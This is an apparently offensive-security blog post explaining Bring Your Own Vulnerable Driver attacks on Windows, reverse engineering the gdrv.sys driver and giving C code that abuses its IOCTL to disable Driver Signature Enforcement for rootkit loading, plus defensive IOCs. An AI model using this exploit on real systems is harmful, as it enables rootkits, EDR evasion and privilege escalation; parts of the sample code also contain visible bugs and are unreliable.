---
title: "BYOVD: Bring Your Own Vulnerable Driver"
date: 2025-06-06 10:00:00 -0300
categories: [hacking,driver,kernel,windows]
tags: [malware,exploit,kernel]
---

## What is a driver?

A driver is a type of executable similar to a PE file, but it is designed to run in kernel mode, granting it elevated privileges. This execution context allows the driver to interact directly with hardware components, manage low-level system resources such as memory, and access kernel APIs with minimal abstraction.

However its a high-privilege execution, a driver has a significant degree of control over the system. As a example, Endpoint Detection and Response (EDR) solutions often leverage kernel-mode drivers to monitor and identify and classify processes, detect malicious behaviors such as BadUSB attacks, DPI inspection on network traffic.

One of the main reasons drivers operate in kernel mode is security enforcement—to ensure that protection mechanisms cannot be easily bypassed by user-mode processes with administrative privileges.

Why this can be a problem ? When a flaw exists in a driver, it can be exploited to gain code execution.

## What can a vulnerable driver do in a Red Team Operation?

In Red Team Operation you can use a vulnerable driver to gain more access to system like being more stealthier, kill EDRs, gain high privilege, blind EDRs, modify token, ....

There are many reasons to leverage a driver exploit:
- Privilege escalation to SYSTEM
- Changing PP/PPL
- Modifying tokens
- Hide any process
- Removing kernel callbacks
- Disabling ETW
- Bypassing DSE (if VBS is not enabled)
- ...

These is a few reasons to what you can do with a vulnerable driver. However, exploiting a driver isn’t that simple. Microsoft has implemented many restrictions to prevent driver exploits.

- **HVCI (Hypervisor-Protected Code Integrity)** is a security feature introduced in Windows 10 to validate drivers against the vulnerable-drivers blocklist.
- **VBS (Virtualization-based Security)** virtualizes hardware components to isolate the kernel (Secure Kernel).
- **KPP (Kernel Patch Guard)** monitors the kernel integrity; if corruption is detected or some critical function is changed, it triggers a **KeBugCheck**, causing a BSOD, luckly this routine is not always been moniroting the kernel so, we can abuse that to use our exploit.
- A driver can only run with a valid signature after 15/June 2015 but is possible to use a leaked/stolen certificate to sign rootkit, similar do Nvidia certficiate leaked by lapsus$.

These protections exist for one of main reason: many **APTs** use vulnerable or malicious drivers to gain high-privilege, hide process, wipe data.

You can and should verify if HVCI is enable using Registry with following command:

```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name Enabled
```

If returns 1 is becaused VBS is enabled or if return 2 is because HVCI is enabled.

Although Microsoft created the Windows Hardware Quality Labs (WHQL) to certify third-party drivers and ensure they meet safety standards, the process isn't malicious. Malicious drivers have been accidentally approved.

## How does a driver work?

We've discussed about driver but how its really works ? A driver interact to system using [IRP (I/O Request Packet) structure](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp) to manage data within the driver.

Drivers always have a symbolic link. Symbolic Link is a Named Device Object to user-mode applications to communicate with the driver using APIs like `CreateFile` and `DeviceIoControl`.

Here is an example of code:

Client:
```c
// Client to driver via symbolic link \\.\w00tw00t
#define IOCTL_READ 0x8000
// ...
handle = CreateFile("\\.\\w00w00t"); //CreateFile to create a handle
DeviceIoControl(handle, IOCTL_READ, buffers, ...); //Communicate to drivrer
```

Driver:
```c
device = IoCreateDevice(...); 
IoCreateSymbolicLink(device, symLinkName); //Create e symbolic link
// ...
IRP_MJ_DEVICE_CONTROL = IRP_Handler; //Major Function control
// ...
IRP_Handler() {
    if (IOCTL == 0x8000) {
        //Read data
    }
}
```

A driver uses IOCTL codes to determine which function to execute.

In **ci.dll**, the variable **g_CiOptions** controls DSE (Driver Signature Enforcement).
DSE verifies whether a driver runs without a valid signature. Can be above values:
- `0x6` (Enabled)
- `0x0` (Disabled)
- `0xE` (TestSigning mode)

## IRP Internals

[IRP (I/O Request Packets) Internals](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp) is main data structure used by the driver to I/O operations.

```c
//struct from https://learn.microsoft.com/pt-br/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
typedef struct _IRP {
  CSHORT                    Type;
  USHORT                    Size;
  PMDL                      MdlAddress;
  ULONG                     Flags;
  union {
    struct _IRP     *MasterIrp;
    __volatile LONG IrpCount;
    PVOID           SystemBuffer;
  } AssociatedIrp;
  LIST_ENTRY                ThreadListEntry;
  IO_STATUS_BLOCK           IoStatus;
  KPROCESSOR_MODE           RequestorMode;
  BOOLEAN                   PendingReturned;
  CHAR                      StackCount;
  CHAR                      CurrentLocation;
  BOOLEAN                   Cancel;
  KIRQL                     CancelIrql;
  CCHAR                     ApcEnvironment;
  UCHAR                     AllocationFlags;
  union {
    PIO_STATUS_BLOCK UserIosb;
    PVOID            IoRingContext;
  };
  PKEVENT                   UserEvent;
  union {
    struct {
      union {
        PIO_APC_ROUTINE UserApcRoutine;
        PVOID           IssuingProcess;
      };
      union {
        PVOID                 UserApcContext;
#if ...
        _IORING_OBJECT        *IoRing;
#else
        struct _IORING_OBJECT *IoRing;
#endif
      };
    } AsynchronousParameters;
    LARGE_INTEGER AllocationSize;
  } Overlay;
  __volatile PDRIVER_CANCEL CancelRoutine;
  PVOID                     UserBuffer;
  union {
    struct {
      union {
        KDEVICE_QUEUE_ENTRY DeviceQueueEntry;
        struct {
          PVOID DriverContext[4];
        };
      };
      PETHREAD     Thread;
      PCHAR        AuxiliaryBuffer;
      struct {
        LIST_ENTRY ListEntry;
        union {
          struct _IO_STACK_LOCATION *CurrentStackLocation;
          ULONG                     PacketType;
        };
      };
      PFILE_OBJECT OriginalFileObject;
    } Overlay;
    KAPC  Apc;
    PVOID CompletionKey;
  } Tail;
} IRP;
```

- **AssociatedIrp.SystemBuffer**: Points to a buffer allocated by the I/O manager, which contains data passed from user mode. This buffer is used for both input and output in **IOCTL** operations.

- **Tail.Overlay.CurrentStackLocation**: Points to the current **IO_STACK_LOCATION** structure, which provides detailed context for the I/O operation.

- **CurrentStackLocation.Parameters**: Holds the parameters specific to the current I/O request.

- **MajorFunction**: A member of the driver's **DRIVER_OBJECT**, indicating the type of I/O request being processed. It can take values such as:
  - `IRP_MJ_CREATE`
  - `IRP_MJ_READ`
  - `IRP_MJ_WRITE`
  - `IRP_MJ_DEVICE_CONTROL`
  - ... and other `IRP_MJ_*` constants representing different I/O operations.


## Common vulnerabilities

A driver can have common driver vulnerabilities include:
- Arbitrary read/write primitives, abusing that you can write/read in any address of system
- Stack/heap overflows //Data overflow

Knowing that, you can put the theory in practice, doing static reverse engineering in one vulnerable driver
# Hands-on

The Reverse Enginerring above is about the driver sample `gdrv.sys` (Gigabyte driver) from [LOLDrivers](https://www.loldrivers.io/) but others driver can have similar vulnerabities like `RTCore64.sys`.

The entry point of a driver is the `DriverEntry` which is a function exported in EAT:

![DriverEntry export](/assets/byovd/driverentry.png)

Within `DriverEntry`, the DriverObject pointer is passed to a setup routine:

![Parsing DriverEntry](/assets/byovd/driverentryrev.png)

That routine creates the symbolic link and assigns the IRP_MJ_DEVICE_CONTROL handler:

![sub_13320](/assets/byovd/sub_13320.png)

IRP handlers inspect `CurrentStackLocation->Parameters` and dispatch based on the IOCTL code:

![IRP Handler](/assets/byovd/irphandler.png)

Into the function IRP_Handler its call CurrentStackLocation, MajorFunction, InputBuffer, OutputBuffer and IoControlCode

CurrentStackLocation is called to manage MajorFunction to se what MajorFunction client called, InputBuffer to see what buffer clients sends and OutputBuffer if have and Output from Driver.

IoControlCode to see what IOCTL is called to see what client calls to see what function will be executed

Going down its possible to see a switch function to what IOCTL do you wanna to use

![IOCTL](/assets/byovd/ioctl1.png)

Into the switch he will compare to few IOCTL code and `0xC3502808` IOCTL Code has a memcpy-like function and vulnerable to exploit.

![Memcpy-like Function](/assets/byovd/memcpy.png)

Dst and Source is a SystemBuffer received with a length of 8 bytes because its is [QWORD](https://learn.microsoft.com/en-us/cpp/assembler/masm/qword?view=msvc-170) and Size is [DWORD](https://learn.microsoft.com/pt-br/cpp/assembler/masm/dword?view=msvc-170) so its have a lenth of 4 bytes, its enough to exploit and run our own rootkit.

## So, how exploit it ?

Developing an exploit for a vulnerable driver becomes not so hard once you understand the process and mechanisms of the Windows kernel.

First of wall, i required to get the value of DSE but required need to calculate the offset because in any update an kernel address will change

It's possible to load in-memory PDB from the internet, similar to [EDRSandblast](https://raw.githubusercontent.com/wavestone-cdt/EDRSandblast/refs/heads/master/Offsets/ExtractOffsets.py) or calculate from yourself, using patterns or debbugger too.

An example code how to get a DSE offset:
```c
HMODULE CiHandle = LoadLibraryExA("ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
if(!CiHandle) {
  return -1;
}
PBYTE CiInitializeOffset = (PBYTE)GetProcAddress(CiHandle, "CiInitialize");
if(CiInitializeOffset == NULL) {
  ULONG64 Address = (ULONG64)(CiInitializeOffset - (PBYTE)CiHandle + baseAddressKernel);
  printf("DSE: %p\n",(Address+gCiOptionsOffset)); //You need to find de g_CiOptions
  return 0;
} else {
  return -1;
}
```
Its use ci.dll!CiInitialize because its nearest memory address to g_CiOptions of DSE

After calculate the offset of a DSE, to send the payload its required communicate with a Driver and exploit using the IOCTL found, after have a symbolic link and MajorFunction

```c
#define IOCTL_CODE 0xC3502808;
typedef struct _MemcpyLikeFunc {
	ULONG64 dest;
	ULONG64* src;
	DWORD size;
} MemcpyLikeFunc;
...
MemcpyLikeFunc gdrvStruct;
gdrvStruct.dest = gCiOptionsAddress; //ci.dll!g_CiOptions
gdrvStruct.size = 1; // 1 byte legnth
gdrvStruct.src = (ULONG64*)0xe; //TestSigning Mode 
HANDLE HandleDriver = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
if(!HandleDriver) {
  return -1;
}
BYTE buff[0x30] = NULL;
DeviceIoControl(HandleDriver, IOCTL_CODE, (LPVOID)&gdrvStruct, sizeof(gdrvStruct), (LPVOID)buff, sizeof(buff), NULL, NULL);
... //rootkit load here
gdrvStruct.src = (ULONG64*)0x6; //Enable DSE to avoid KeBugCheck routine
DeviceIoControl(HandleDriver, IOCTL_CODE, (LPVOID)&gdrvStruct, sizeof(gdrvStruct), (LPVOID)buff, sizeof(buff), NULL, NULL);
CloseHandle(HandleDriver);
```
To check if DSE status you can use WinDBG attached to a kernel with with the following command:
```asm
kd> dt ci.dll!g_CiOptions L1
<AddressHere> 0xe
```

And the code to exploit is that, not a monstruosity code and try to avoids KeBugCheck and its possible loads rootkit.

And there is how to identify and exploit Driver to abuse that in Red Team Operation.


# Indication of Compromisse (IOC)s

## MD5 hashes
- b0954711c133d284a171dd560c8f492a
- 043d5a1fc66662a3f91b8a9c027f9be9
- 3c55092900343d3d28564e2d34e7be2c
- 7907e14f9bcf3a4689c9a74a1a873cb6
- a72e10ecea2fdeb8b9d4f45d0294086b
- 31f34de4374a6ed0e70a022a0efa2570
- 4e093256b034925ecd6b29473ff16858
- 1549e6cbce408acaddeb4d24796f2eaf
- c832a4313ff082258240b61b88efa025
- d556cb79967e92b5cc69686d16c1d846

## SHA1 hashes
- 4f0d9122f57f4f8df41f3c3950359eb1284b9ab5
- 3d8cc9123be74b31c597b0014c2a72090f0c44ef
- 1a56614ea7d335c844b7fc6edd5feb59b8df7b55
- b9b72a5be3871ddc0446bae35548ea176c4ea613
- 4692730f6b56eeb0399460c72ade8a15ddd43a62
- c70989ed7a6ad9d7cd40ae970e90f3c3f2f84860
- eba5483bb47ec6ff51d91a9bdf1eee3b6344493d
- 18f09ec53f0b7d2b1ab64949157e0e84628d0f0a
- 1f1ce28c10453acbc9d3844b4604c59c0ab0ad46
- de2b56ef7a30a4697e9c4cdcae0fc215d45d061d

## Other
- Unknown binary running with anomalous behaviour;
- Unknown drivers running;
- Communicate to Microsoft and exeucting CreateFile and DeviceIoControl to \\.\GIO;
- SymLink \\\\.\\GIO open.
